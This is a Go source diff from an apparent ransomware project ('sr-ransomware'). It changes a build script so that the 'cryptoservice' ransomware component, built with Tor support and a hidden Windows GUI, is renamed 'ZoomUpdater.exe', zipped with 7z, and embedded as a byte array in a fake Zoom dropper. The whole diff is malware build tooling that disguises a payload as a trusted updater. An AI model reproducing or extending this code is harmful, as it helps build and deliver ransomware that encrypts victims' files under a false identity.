@@ -11,7 +11,8 @@ import (
 )
 
 const workdir = "tmp"
-var cryptoservicePath = filepath.Join(workdir, "cryptoservice.exe")
+var cryptoserviceExe = filepath.Join(workdir, "ZoomUpdater.exe")
+var cryptoserviceZip = filepath.Join(workdir, "ZoomUpdater.zip")
 
 func main() {
     log.Println("> Generating github.com/sug0/sr-ransomware/go/main/fakezoom/cryptoservice_buffer.go")
@@ -28,7 +29,7 @@ func main() {
         log.Fatal(err)
     }
     w := bufio.NewWriter(f)
-    fmt.Fprintf(w, "package main;var cryptoserviceEXE=[]byte{")
+    fmt.Fprintf(w, "package main;var cryptoserviceZIP=[]byte{")
     for i := 0; i < len(cryptoservice); i++ {
         fmt.Fprintf(w, "%d,", cryptoservice[i])
     }
@@ -40,13 +41,19 @@ func cryptoserviceBytes() ([]byte, error) {
     if err := os.Mkdir(workdir, os.ModePerm); err != nil && !os.IsExist(err) {
         return nil, err
     }
-    if _, err := os.Stat(cryptoservicePath); err != nil {
+    if _, err := os.Stat(cryptoserviceExe); err != nil {
         err = buildCryptoservice()
         if err != nil {
             return nil, err
         }
     }
-    f, err := os.Open(cryptoservicePath)
+    if _, err := os.Stat(cryptoserviceZip); err != nil {
+        err = packCryptoservice()
+        if err != nil {
+            return nil, err
+        }
+    }
+    f, err := os.Open(cryptoserviceZip)
     if err != nil {
         return nil, err
     }
@@ -59,7 +66,19 @@ func buildCryptoservice() error {
         "go", "build",
         "-tags", "tor",
         "-ldflags", "-H=windowsgui -s -w",
-        "-o", cryptoservicePath,
+        "-o", cryptoserviceExe,
         "github.com/sug0/sr-ransomware/go/main/cryptoservice",
     ).Run()
+}
+
+func packCryptoservice() error {
+    err := os.Chdir(workdir)
+    if err != nil {
+        return err
+    }
+    err = exec.Command("7z", "-tzip", "-mx=9", "a", filepath.Base(cryptoserviceZip), filepath.Base(cryptoserviceExe)).Run()
+    if err != nil {
+        return err
+    }
+    return os.Chdir("..")
 }
